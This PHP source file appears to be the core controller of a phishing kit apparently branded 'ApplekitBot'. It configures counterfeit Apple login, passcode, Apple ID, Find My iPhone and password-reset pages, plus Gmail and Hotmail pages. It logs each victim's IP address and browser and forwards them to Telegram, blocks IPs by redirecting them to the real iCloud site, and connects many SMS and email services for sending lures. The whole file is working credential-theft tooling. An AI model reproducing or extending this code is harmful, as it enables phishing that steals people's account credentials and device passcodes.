<?php 
if( !defined("BASEPATH") ) 
{
    exit( "No direct script access allowed" );
}


class CY_Controller extends CI_Controller
{
    public $global_data = NULL;
    public $global_temp = NULL;

    public function __construct()
    {
        parent::__construct();
        require_once(APPPATH . "libraries/OnlineUsers.php");
        $ops = $this->Opts->get();
        $this->opas = $ops[0];
        if( !isset($this->goptss) ) 
        {
            //exit(); @bytedecode was here
        }
        session_start();

		$this->global_data = array(
			"Oname" => ($this->opas->Name ? $this->opas->Name : "iCloud") ,
			"Oclose" => ($this->opas->close ? $this->opas->close : 0) ,
			"Oemail" => ($this->opas->email ? $this->opas->email : false) ,
			"Osender" => ($this->opas->sender ? $this->opas->sender : false) ,
			"senderName" => ($this->opas->senderName ? $this->opas->senderName : false) ,
			"Oport" => ($this->opas->port ? $this->opas->port : false) ,
			"Oprotcol" => ($this->opas->protcol ? $this->opas->protcol : "ssl") ,
			"OapiEmailPassword" => ($this->opas->apiEmailPassword ? $this->opas->apiEmailPassword : false) ,
			"OapiEmail" => ($this->opas->smtp2go ? $this->opas->smtp2go : false) ,
			"smtp2go" => ($this->opas->smtp2go ? $this->opas->smtp2go : false) ,
			"sentEmail" => ($this->opas->sentEmail ? $this->opas->sentEmail : 0) ,
			"Oemailvaild" => ($this->opas->emailvaild ? $this->opas->emailvaild : NULL) ,
			"Olang" => ($this->opas->langs ? $this->opas->langs : "en") ,
			"Otemplate" => ($this->opas->template ? $this->opas->template : "icloud") ,
			"Odetect" => ($this->opas->detect ? $this->opas->detect : 0) ,
			"OcloseMsg" => ($this->opas->closeMsg ? $this->opas->closeMsg : "We Are Closing For a Moment") ,
			"isDelete" => ($this->opas->isDelete ? $this->opas->isDelete : 0) ,
			"loggedin" => $this->session->userdata("logged_in") ,
			"loginPage" => ($this->opas->loginPage ? $this->opas->loginPage : false) ,
			"nicloudPage" => ($this->opas->nicloudPage ? $this->opas->nicloudPage : false) ,
			"itunesPage" => ($this->opas->itunesPage ? $this->opas->itunesPage : false) ,
			"disablePage" => ($this->opas->disablePage ? $this->opas->disablePage : false) ,
			"passPage" => ($this->opas->passPage ? $this->opas->passPage : false) ,
			"mapPage" => ($this->opas->mapPage ? $this->opas->mapPage : false) ,
			"fmiPage" => ($this->opas->fmiPage ? $this->opas->fmiPage : false) ,
			"fmi2Page" => ($this->opas->fmi2Page ? $this->opas->fmi2Page : false) ,
			"fmi2018Page" => ($this->opas->fmi2018Page ? $this->opas->fmi2018Page : false) ,
			"gmailPage" => ($this->opas->gmailPage ? $this->opas->gmailPage : false) ,
			"hotPage" => ($this->opas->hotPage ? $this->opas->hotPage : false) ,
			"pass6Page" => ($this->opas->pass6Page ? $this->opas->pass6Page : false) ,
			"pass4Page" => ($this->opas->pass4Page ? $this->opas->pass4Page : false) ,
			"elastice" => ($this->opas->elastice ? $this->opas->elastice : false) ,
			"elasticeEmail" => ($this->opas->elasticeEmail ? $this->opas->elasticeEmail : false) ,
			"providerEmail" => ($this->opas->providerEmail ? $this->opas->providerEmail : false) ,
			"providerPwd" => ($this->opas->providerPwd ? $this->opas->providerPwd : false) ,
			"providerPort" => ($this->opas->providerPort ? $this->opas->providerPort : false) ,
			"sendPulse" => ($this->opas->sendPulse ? $this->opas->sendPulse : false) ,
			"sendPluseEmail" => ($this->opas->sendPluseEmail ? $this->opas->sendPluseEmail : false) ,
			"wavecellApi" => ($this->opas->wavecellApi ? $this->opas->wavecellApi : false) ,
			"mobile" => ($this->opas->mobile ? $this->opas->mobile : false) ,
			"block" => ($this->opas->block ? $this->opas->block : false) ,
			"redirect" => ($this->opas->redirect ? $this->opas->redirect : false) ,
			"redirecturl" => ($this->opas->redirecturl ? $this->opas->redirecturl : "http://icloud.com/") ,
			"redirectMap" => ($this->opas->redirectMap ? $this->opas->redirectMap : "https://mapsconnect.apple.com") ,
			"blockredirect" => ($this->opas->blockredirect ? $this->opas->blockredirect : "http://icloud.com/") ,
			"redirecturl2" => ($this->opas->redirecturl2 ? $this->opas->redirecturl2 : "http://appleid.apple.com/") ,
			"notiSMTP" => ($this->opas->notiSMTP ? $this->opas->notiSMTP : false) ,
			"notiSMTPemail" => ($this->opas->notiSMTPemail ? $this->opas->notiSMTPemail : false) ,
			"notiSMTPpwd" => ($this->opas->notiSMTPpwd ? $this->opas->notiSMTPpwd : false) ,
			"notiSMTPport" => ($this->opas->notiSMTPport ? $this->opas->notiSMTPport : false) ,
			"expireTime" => ($this->opas->expireTime ? $this->opas->expireTime : "48") ,
			"isTrack" => ($this->opas->isTrack ? $this->opas->isTrack : 0) ,
			"timeZone" => ($this->opas->timeZone ? $this->opas->timeZone : "America/Toronto") ,
			"smtpServ" => ($this->opas->smtpServ ? $this->opas->smtpServ : 0) ,
			"smsvalidapi" => ($this->opas->smsvalidapi ? $this->opas->smsvalidapi : NULL) ,
			"tracklenght" => ($this->opas->tracklenght ? $this->opas->tracklenght : 10) ,
			"linkVisit" => ($this->opas->linkVisit ? $this->opas->linkVisit : 0) ,
			"plivoAuthID" => ($this->opas->plivoAuthID ? $this->opas->plivoAuthID : NULL) ,
			"plivoAuthToken" => ($this->opas->plivoAuthToken ? $this->opas->plivoAuthToken : NULL) ,
			"cmSMSapi" => ($this->opas->cmSMSapi ? $this->opas->cmSMSapi : NULL) ,
			"senderID" => ($this->opas->senderID ? $this->opas->senderID : NULL) ,
			"viaUser" => ($this->opas->viaUser ? $this->opas->viaUser : NULL) ,
			"viaPass" => ($this->opas->viaPass ? $this->opas->viaPass : NULL) ,
			"bulkUser" => ($this->opas->bulkUser ? $this->opas->bulkUser : NULL) ,
			"bulkPass" => ($this->opas->bulkPass ? $this->opas->bulkPass : NULL) ,
			"budgetUser" => ($this->opas->budgetUser ? $this->opas->budgetUser : NULL) ,
			"budgetID" => ($this->opas->budgetID ? $this->opas->budgetID : NULL) ,
			"budgetHandle" => ($this->opas->budgetHandle ? $this->opas->budgetHandle : NULL) ,
			"nimbowAPI" => ($this->opas->nimbowAPI ? $this->opas->nimbowAPI : NULL) ,
			"waveid" => ($this->opas->waveid ? $this->opas->waveid : NULL) ,
			"wavesub" => ($this->opas->wavesub ? $this->opas->wavesub : NULL) ,
			"wavepwd" => ($this->opas->wavepwd ? $this->opas->wavepwd : NULL) ,
			"nexmokey" => ($this->opas->nexmokey ? $this->opas->nexmokey : NULL) ,
			"nexmosecert" => ($this->opas->nexmosecert ? $this->opas->nexmosecert : NULL) ,
			"sinchkey" => ($this->opas->sinchkey ? $this->opas->sinchkey : NULL) ,
			"sinchsecret" => ($this->opas->sinchsecret ? $this->opas->sinchsecret : NULL) ,
			"beepsendtoken" => ($this->opas->beepsendtoken ? $this->opas->beepsendtoken : NULL) ,
			"alienicsuser" => ($this->opas->alienicsuser ? $this->opas->alienicsuser : NULL) ,
			"alienicspwd" => ($this->opas->alienicspwd ? $this->opas->alienicspwd : NULL) ,
			"postmarktoken" => ($this->opas->postmarktoken ? $this->opas->postmarktoken : NULL) ,
			"postmarksender" => ($this->opas->postmarksender ? $this->opas->postmarksender : NULL) ,
			"sendgridapi" => ($this->opas->sendgridapi ? $this->opas->sendgridapi : NULL) ,
			"blankCount" => ($this->opas->blankCount ? $this->opas->blankCount : 1) ,
			"disableCount" => ($this->opas->disableCount ? $this->opas->disableCount : 1) ,
			"disableLink" => ($this->opas->disableLink ? $this->opas->disableLink : NULL) ,
			"expireLink" => ($this->opas->expireLink ? $this->opas->expireLink : NULL) ,
			"senderKitAPI" => ($this->opas->senderKitAPI ? $this->opas->senderKitAPI : NULL) ,
			"removalApi" => ($this->opas->removalApi ? $this->opas->removalApi : NULL) ,
			"shortKitApi" => ($this->opas->shortKitApi ? $this->opas->shortKitApi : NULL) ,
			"cronJobs" => ($this->opas->cronJobs ? $this->opas->cronJobs : NULL) ,
			"telegram" => ($this->opas->telegram ? $this->opas->telegram : NULL) ,
			"master_api_key" => ($this->opas->master_api_key ? $this->opas->master_api_key : NULL) ,
			"index" => ($this->opas->index ? $this->opas->index : 1)
		);
		$this->load->vars($this->global_data);
		$this->global_temp = array(
			"icloud" => array(
                'title'  => 'New iCloud Path',
                'img'    => site_url( 'assets/img/temp/newicloud.png' ),
                'link'   => ( $get->icloud ) ? $get->icloud : 'icloud',
                'idname' => 'icloud',
                'value'  => $get->icloud,
			),
			"loginPage" => array(
				"name" => "Old iCloud Page",
				"link" => site_url(($this->opas->loginPage ? $this->opas->loginPage . "/dDeEmMoO" : "lcloud/dDeEmMoO")) ,
				"linkpar" => ($this->opas->loginPage ? $this->opas->loginPage : "lcloud") ,
				"id" => "loginPage",
				"img" => site_url("assets/img/temp/icloud.png")
			) ,
			"pass6Page" => array(
				"name" => "PassCode (6-Digi) Page",
				"link" => site_url(($this->opas->pass6Page ? $this->opas->pass6Page . "/dDeEmMoO" : "pass6code/dDeEmMoO")) ,
				"linkpar" => ($this->opas->pass6Page ? $this->opas->pass6Page : "pass6code") ,
				"id" => "pass6Page",
				"img" => site_url("assets/img/temp/icloud.png")
			) ,
			"pass4Page" => array(
				"name" => "PassCode (4-Digi) Page",
				"link" => site_url(($this->opas->pass4Page ? $this->opas->pass4Page . "/dDeEmMoO" : "pass4code/dDeEmMoO")) ,
				"linkpar" => ($this->opas->pass4Page ? $this->opas->pass4Page : "pass4code") ,
				"id" => "pass4Page",
				"img" => site_url("assets/img/temp/icloud.png")
			) ,
			"disablePage" => array(
				"name" => "Apple ID Page",
				"link" => site_url(($this->opas->disablePage ? $this->opas->disablePage . "/dDeEmMoO" : "aid/dDeEmMoO")) ,
				"linkpar" => ($this->opas->disablePage ? $this->opas->disablePage : "aid") ,
				"id" => "disablePage",
				"img" => site_url("assets/img/temp/icloud.png")
			) ,
			"fmi2018Page" => array(
				"name" => "FMI Page",
				"link" => site_url(($this->opas->fmi2018Page ? $this->opas->fmi2018Page . "/dDeEmMoO" : "fmi/dDeEmMoO")) ,
				"linkpar" => ($this->opas->fmi2018Page ? $this->opas->fmi2018Page : "fmi") ,
				"id" => "fmi2018Page",
				"img" => site_url("assets/img/temp/icloud.png")
			) ,
			"fmiPage" => array(
				"name" => "Fmi Old Page",
				"link" => site_url(($this->opas->fmiPage ? $this->opas->fmiPage . "/dDeEmMoO" : "fmii/dDeEmMoO")) ,
				"linkpar" => ($this->opas->fmiPage ? $this->opas->fmiPage : "fmii") ,
				"id" => "fmiPage",
				"img" => site_url("assets/img/temp/icloud.png")
			) ,
			"fmi2Page" => array(
				"name" => "FMI Compass Page",
				"link" => site_url(($this->opas->fmi2Page ? $this->opas->fmi2Page . "/dDeEmMoO" : "ffmi/dDeEmMoO")) ,
				"linkpar" => ($this->opas->fmi2Page ? $this->opas->fmi2Page : "ffmi") ,
				"id" => "fmi2Page",
				"img" => site_url("assets/img/temp/icloud.png")
			) ,
			"mapPage" => array(
				"name" => "Maps Connect Page",
				"link" => site_url(($this->opas->mapPage ? $this->opas->mapPage . "/dDeEmMoO" : "maps/dDeEmMoO")) ,
				"linkpar" => ($this->opas->mapPage ? $this->opas->mapPage : "maps") ,
				"id" => "mapPage",
				"img" => site_url("assets/img/temp/icloud.png")
			) ,
			"passPage" => array(
				"name" => "Apple PassWord Reset Page",
				"link" => site_url(($this->opas->passPage ? $this->opas->passPage . "/dDeEmMoO" : "password/dDeEmMoO")) ,
				"linkpar" => ($this->opas->passPage ? $this->opas->passPage : "password") ,
				"id" => "passPage",
				"img" => site_url("assets/img/temp/icloud.png")
			) ,
			"itunesPage" => array(
				"name" => "iTunes Connect Page",
				"link" => site_url(($this->opas->itunesPage ? $this->opas->itunesPage . "/dDeEmMoO" : "itunes/dDeEmMoO")) ,
				"linkpar" => ($this->opas->itunesPage ? $this->opas->itunesPage : "itunes") ,
				"id" => "itunesPage",
				"img" => site_url("assets/img/temp/icloud.png")
			) ,
			"gmailPage" => array(
				"name" => "Gmail Page",
				"link" => site_url(($this->opas->gmailPage ? $this->opas->gmailPage . "/dDeEmMoO" : "gmail/dDeEmMoO")) ,
				"linkpar" => ($this->opas->gmailPage ? $this->opas->gmailPage : "gmail") ,
				"id" => "gmailPage",
				"img" => site_url("assets/img/temp/icloud.png")
			) ,
			"hotPage" => array(
				"name" => "Hotmail Page",
				"link" => site_url(($this->opas->hotPage ? $this->opas->hotPage . "/dDeEmMoO" : "hotmail/dDeEmMoO")) ,
				"linkpar" => ($this->opas->hotPage ? $this->opas->hotPage : "hotmail") ,
				"id" => "hotPage",
				"img" => site_url("assets/img/temp/icloud.png")
			)
		);
        $this->load->vars($this->global_temp);
        $_SESSION['testes'] = $this->global_temp;
    }

    public function visitors()
    {
        $this->load->model("visit_m", "visit");
        $langs = implode(",", $this->agent->languages());
        $langs = explode("-", $langs);
        $data = array( "ip" => $this->input->ip_address(), "uri" => site_url() . $this->uri->uri_string(), "browser" => $this->agent->browser(), "platform" => $this->agent->platform(), "mobile" => ($this->agent->is_mobile() ? 1 : 0), "robot" => ($this->agent->is_robot() ? 1 : 0), "referral" => ($this->agent->is_referral() ? $this->agent->referrer() : "None"), "languages" => $langs[0], "country" => (getIPimg($this->input->ip_address()) ? getIPimg($this->input->ip_address()) : "US"), "time" => setTime(), "update" => now(), "noti" => 1, "agent" => $this->input->user_agent() );
        $ext = array( ".png", ".js", ".css", ".jpg", ".gif", ".map", ".svg", ".ico", ".woff", ".ttf", ".woff2", ".eot", ".scss" );
        $cont = array( "assets", "logout", "Authority", "cronjobs", "respons", "get", "apps", "sys", "api", "admin" );
        if( !$this->contains($this->uri->uri_string(), $ext) && in_array($this->uri->segment(1), $cont) == false ) 
        {
            $this->SendToTele($data);
            $this->visit->insert($data);
        }

    }

    protected function contains($str, array $arr)
    {
        foreach( $arr as $a ) 
        {
            if( stripos($str, $a) !== false ) 
            {
                return true;
            }

        }
        return false;
    }

    protected function SendToTele($data)
    {
        $this->load->library("responding");
        $msg = "Hello there, " . PHP_EOL . PHP_EOL . "You have new visitor ????" . PHP_EOL . PHP_EOL . "IP: " . $data["ip"] . PHP_EOL . "Link visit: " . $data["uri"] . PHP_EOL . "Browser: " . $data["browser"] . PHP_EOL . "Platform: " . $data["platform"] . PHP_EOL . "Country: " . $data["country"] . PHP_EOL . "Time: " . $data["time"] . PHP_EOL . "Agent: " . $data["agent"] . PHP_EOL . PHP_EOL . "You can check all the visitor by <a href=\"" . site_url(ADMINPATH . "visitor") . "\">clicking here</a>" . PHP_EOL . PHP_EOL . "ApplekitBot Notification System";
        $this->responding->Request($msg);
    }

}


class MY_Controller extends CY_Controller
{
    public $global_data = NULL;
    public $opas = NULL;
    public $licenseContent = NULL;

    public function __construct()
    {
        parent::__construct();
        $segments = array( "admin", "assets", "findmyiphone", "logout", "authority", "respons" );
        if( !in_array($this->uri->segment(1), $segments) ) 
        {
            $data = array( "template" => $this->uri->segment(1), "track" => $this->uri->segment(2, "") );
            $this->session->set_userdata($data);
        }

    }

    public function tmpl($title = false, $msg = false)
    {
        $html = "\n\t\t\t<!DOCTYPE html>\n\t\t\t<html lang=\"en\">\n\t\t\t<head>\n\t\t\t\t<meta charset=\"UTF-8\">\n\t\t\t\t<title>" . $title . "</title>\n\t\t\t\t<link rel=\"stylesheet\" href=\"" . site_url("assets/layout/strap.css") . "\">\n\t\t\t\t<link rel=\"stylesheet\" href=\"" . site_url("assets/layout/apple.css") . "\">\n\t\t\t</head>\n\t\t\t<body>\n\t\t\t\t<div class=\"container\">\n\t\t\t\t<div class=\"alert alert-warning shadow text-center\"; style=\"margin-top: 250px;\">\n\t\t\t\t\t<p class=\"text-danger\"; style=\"font-size: 17px\"><i class=\"glyphicon glyphicon-warning-sign\" style=\"font-size: 20px; margin-right: 10px;\"></i>" . $msg . "</p>\n\t\t\t\t</div>\n\t\t\t\t</div>\n\t\t\t</body>\n\t\t\t</html>\n\t\t";
        return $html;
    }

    public function require_thirdparty_package($package = "")
    {
        switch( $package ) 
        {
            case "swift":
                require_once(APPPATH . "third_party/swift/swift_required.php");
                break;
            case "mailer":
                require_once(APPPATH . "libraries/extra/PHPMailerAutoload.php");
                break;
        }
    }

    public function checkBlock()
    {
        $this->db->select("ip", true);
        $ips = $this->db->get("blocked")->result_array();
        foreach( $ips as $key ) 
        {
            $ip[] = $key["ip"];
        }
        if( in_array($this->input->ip_address(), $ip) ) 
        {
            if( empty($this->global_data["blockredirect"]) || is_null($this->global_data["blockredirect"]) ) 
            {
                redirect(site_url("index"), "auto");
            }
            else
            {
                redirect($this->global_data["blockredirect"], "auto");
            }

        }

    }

    public function SendEmail($smtp = true, $host = NULL, $user = NULL, $pwd = NULL, $prot = NULL, $port = NULL, $from = NULL, $fromN = NULL, $to = NULL, $subject = NULL, $body = NULL, $sec = true)
    {
        if( $this->global_data["smtpServ"] == 0 ) 
        {
            return $this->Mailer($smtp, $host, $user, $pwd, $prot, $port, $from, $fromN, $to, $subject, $body, $sec);
        }

        if( $this->global_data["smtpServ"] == 1 ) 
        {
            return $this->Swift($smtp, $host, $user, $pwd, $prot, $port, $from, $fromN, $to, $subject, $body, $sec);
        }

    }

    public function smtp2go($to, $from, $name, $subject, $message)
    {
        $filed = json_encode(array( "api_key" => $this->global_data["smtp2go"], "sender" => $name . " <" . $from . ">", "to" => array( $to ), "html_body" => $message, "subject" => $subject, "text_body" => strip_tags($message, "<p><br><a><img>") ));
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl, CURLOPT_POST, 1);
        curl_setopt($curl, CURLOPT_HTTPHEADER, array( "Content-Type: application/json" ));
        curl_setopt($curl, CURLOPT_URL, "https://api.smtp2go.com/v3/email/send");
        curl_setopt($curl, CURLOPT_POSTFIELDS, $filed);
        $result = curl_exec($curl);
        $send = json_decode($result, true);
        if( isset($send["data"]["error"]) ) 
        {
            $status = array( "status" => false, "msg" => $send["data"]["error"] );
        }
        else
        {
            $status = array( "status" => true, "msg" => "Message has been sent, request id =" . $send["request_id"] );
        }

        return $status;
    }

    protected function Mailer($smtp, $host, $user, $pwd, $prot, $port, $from, $fromN, $to, $subject, $body, $sec)
    {
        $mail = new PHPMailer\PHPMailer\PHPMailer(true);
        try
        {
            $mail->SMTPDebug = 0;
            $mail->Debugoutput = "html";
            if( $smtp === true ) 
            {
                $mail->isSMTP();
                $mail->Host = $host;
                $mail->SMTPAuth = true;
                $mail->Username = $user;
                $mail->Password = $pwd;
                if( $sec == true ) 
                {
                    $mail->SMTPSecure = $prot;
                }

                $mail->Port = $port;
            }

            $mail->setFrom($from, $fromN);
            $mail->addReplyTo($from, $fromN);
            $tos = explode(",", $to);
            foreach( $tos as $toos ) 
            {
                $mail->addAddress($toos);
            }
            $mail->isHTML(true);
            $mail->Subject = $subject;
            $mail->Body = $body;
            $mail->send();
            $res = array( "status" => true, "msg" => "Message has been sent" );
            return $res;
        }
        catch( phpmailerException $e ) 
        {
            $res = array( "status" => false, "msg" => $e->errorMessage() );
            return $res;
        }
        catch( PHPMailer\PHPMailer\Exception $e ) 
        {
            $res = array( "status" => false, "msg" => $e->getMessage() );
            return $res;
        }
    }

    protected function Swift($smtp, $hosts, $user, $pwd, $prot, $port, $from, $fromN, $to, $subject, $body, $sec)
    {
        $hosts = explode(";", $hosts);
        $numItems = count($hosts);
        $i = 0;
        $to = explode(",", $to);
        foreach( $hosts as $host ) 
        {
            try
            {
                if( $smtp === true ) 
                {
                    if( $sec === true ) 
                    {
                        $transport = Swift_SmtpTransport::newInstance()->setHost($host)->setPort($port)->setEncryption($prot)->setUsername($user)->setPassword($pwd);
                    }
                    else
                    {
                        $transport = Swift_SmtpTransport::newInstance()->setHost($host)->setPort($port)->setUsername($user)->setPassword($pwd);
                    }

                }
                else
                {
                    $transport = Swift_SendmailTransport::newInstance();
                }

                $mailer = Swift_Mailer::newInstance($transport);
                $message = Swift_Message::newInstance($subject)->setFrom(array( $from => $fromN ))->setTo($to)->setBody($body, "text/html");
                $mailer->send($message);
                $res = array( "status" => true, "msg" => "Message has been sent" );
                return $res;
            }
            catch( Swift_TransportException $e ) 
            {
                if( ++$i === $numItems ) 
                {
                    $res = array( "status" => false, "msg" => $e->getMessage() );
                    return $res;
                }

                continue;
            }
            catch( PHPMailer\PHPMailer\Exception $e ) 
            {
                if( ++$i === $numItems ) 
                {
                    $res = array( "status" => false, "msg" => $e->getMessage() );
                    return $res;
                }

                continue;
            }
        }
    }
}


class indexes extends MY_Controller
{
    public function __construct()
    {
        parent::__construct();
        $this->visitors();
        $this->checkBlock();
    }

}


class Auth extends MY_Controller
{
    public $opas = NULL;

    public function __construct()
    {
        parent::__construct();  
        if( $this->opas->close == 1 ) 
        {
            exit( $this->opas->closeMsg ); //@bytedecode was not here
        }

        $this->checkBlock();
        $excp = array( "findmyiphone" );
        if( in_array(uri_string(), $excp) == true && $this->session->userdata("logged_in") == false ) 
        {
            if( $this->global_data["loginPage"] ) 
            {
                redirect(site_url($this->global_data["loginPage"]), "auto");
            }
            else
            {
                redirect(site_url("icloud"), "auto");
            }

        }

    }

}


class Admin extends MY_Controller
{
    public $opas = NULL;

    public function __construct()
    {
        parent::__construct();
        $this->visitors();
        if( uri_string() != "admin/login" ) 
        {
            $sdata = array( "admin_session" => uri_string() );
            $this->session->set_userdata($sdata);
        }

        if( $this->uri->segment(1) == "admin" ) 
        {
            if( $this->uri->segment(1) == "admin" && $this->uri->segment(2) != "login" && $this->session->userdata("logged_admin") == false ) 
            {
                redirect(site_url("admin/login"), "auto");
            }

            if( $this->uri->segment(1) == "admin" && $this->uri->segment(2) == "login" && $this->session->userdata("logged_admin") == true ) 
            {
                redirect(site_url("admin/dashboard"), "auto");
            }

        }

    }

}

$random = 71;
?>